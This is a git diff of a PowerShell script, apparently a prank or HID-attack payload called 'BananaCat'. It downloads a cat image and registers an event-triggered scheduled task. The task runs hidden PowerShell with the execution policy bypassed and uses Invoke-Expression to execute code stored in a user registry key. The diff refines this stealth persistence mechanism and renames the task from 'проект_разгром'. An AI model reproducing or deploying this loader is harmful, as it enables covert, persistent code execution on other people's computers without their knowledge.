@@ -1,22 +1,19 @@
-# Задаём переменные
 $script_name = "BananaCat"
 $reg_path = "HKCU:\Software\$script_name"
 $CAT_IMAGE_URI = "https://raw.githubusercontent.com/vanos03/BananaCatHIDS/refs/heads/main/cat.jpg"
 $IMAGE_NAME = $script_name
 $CAT_IMAGE_OUT = "$env:TEMP\$IMAGE_NAME.jpg"
 
-# Команда, которая будет записана в XML
-$scriptCode = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Get-ItemProperty -Path '$reg_path' -Name '$script_name').$script_name`""
+$scriptCode = "Invoke-Expression (Get-ItemProperty -Path '$reg_path' -Name '$script_name').$script_name"
 
-# Скачиваем изображение
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $CAT_IMAGE_URI -OutFile $CAT_IMAGE_OUT -ErrorAction SilentlyContinue
 
-# Генерируем XML с подстановкой переменной
 $xmlTemplate = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
-    <URI>\проект_разгром</URI>
+    <URI>\BananaCat</URI>
   </RegistrationInfo>
   <Triggers>
     <EventTrigger>
@@ -55,7 +52,7 @@ $xmlTemplate = @"
   <Actions Context="Author">
     <Exec>
       <Command>powershell.exe</Command>
-      <Arguments>$scriptCode</Arguments>
+      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -Command $scriptCode</Arguments>
       <WorkingDirectory>$env:TEMP</WorkingDirectory>
     </Exec>
   </Actions>
@@ -68,7 +65,9 @@ $tmpXmlPath = "$env:TEMP\task_temp.xml"
 $xml.Save($tmpXmlPath)
 
 # Создаём задачу
-schtasks /Create /TN "проект_разгром" /XML $tmpXmlPath /F
+schtasks /Create /TN "BananaCat" /XML "$tmpXmlPath" /F
+
+
 
 # Удаляем временный XML
 Remove-Item $tmpXmlPath -Force
